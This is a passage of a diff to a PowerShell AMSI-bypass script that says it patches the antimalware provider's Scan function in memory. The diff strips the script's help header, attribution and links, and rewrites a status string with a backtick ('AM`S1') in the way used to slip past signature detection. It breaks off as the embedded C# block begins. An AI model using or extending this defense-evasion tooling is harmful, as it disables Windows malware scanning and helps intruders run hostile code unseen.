@@ -1,36 +1,4 @@
-<#
-.SYNOPSIS
-   Unchain AMS1 by patching the provider's unmonitored memory space
-
-   Author: @Maor Korkos (@maorkor)
-   Tested Under: Windows 10 (19044) x64 bits
-   Required Dependencies: none
-   Optional Dependencies: none
-   PS cmdlet Dev version: v1.0.1
-
-.DESCRIPTION
-   Unchain AMS1 by patching the provider's unmonitored memory space
-
-.EXAMPLE
-   PS C:\> .\ScanInterception_x64.ps1
-
-.INPUTS
-   None. You cannot pipe objects into ScanInterception_x64.ps1
-
-.OUTPUTS
-   * Patching AMS1 memory space.
-     + Adding InteropServices Type.
-     + Loop through all the providers.
-     + Patching the Scan function.
-   * Done, exit cmdlet execution.
-
-.LINK
-   https://github.com/r00t-3xp10it/redpill/tree/main/lib/Ams1-Bypass
-   https://github.com/deepinstinct/AMSI-Unchained/blob/main/ScanInterception_x64.ps1
-#>
-
-
-write-host "`n* Patching AMS1 space." -ForegroundColor Green
+write-host "`n* Patching AM`S1 space." -ForegroundColor Green
 
 $Apis = @"
 using System;
